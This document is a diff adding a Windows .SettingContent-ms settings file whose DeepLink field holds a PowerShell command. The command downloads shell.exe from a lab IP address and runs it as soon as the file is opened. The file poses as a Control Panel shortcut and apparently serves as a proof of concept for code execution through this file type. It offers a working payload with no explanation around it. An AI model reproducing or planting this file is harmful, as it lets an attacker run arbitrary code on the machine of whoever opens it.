@@ -1,0 +1,17 @@
+<PCSettings>
+	<SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
+		<ApplicationInformation>
+			<AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
+			<DeepLink>%windir%\System32\WindowsPowerShell\v1.0\powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.14.138/shell.exe','C:\Users\pexoa\Desktop\shell.exe');C:\Users\pexoa\Desktop\shell.exe</DeepLink>
+			<Icon>%windir%\System32\control.exe</Icon>
+		</ApplicationInformation>
+		<SettingIdentity>
+			<PageID/>
+			<HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
+		</SettingIdentity>
+		<SettingInformation>
+			<Description>@shell32.dll,-4161</Description>
+			<Keywords>@shell32.dll,-4161</Keywords>
+		</SettingInformation>
+	</SearchableContent>
+</PCSettings>
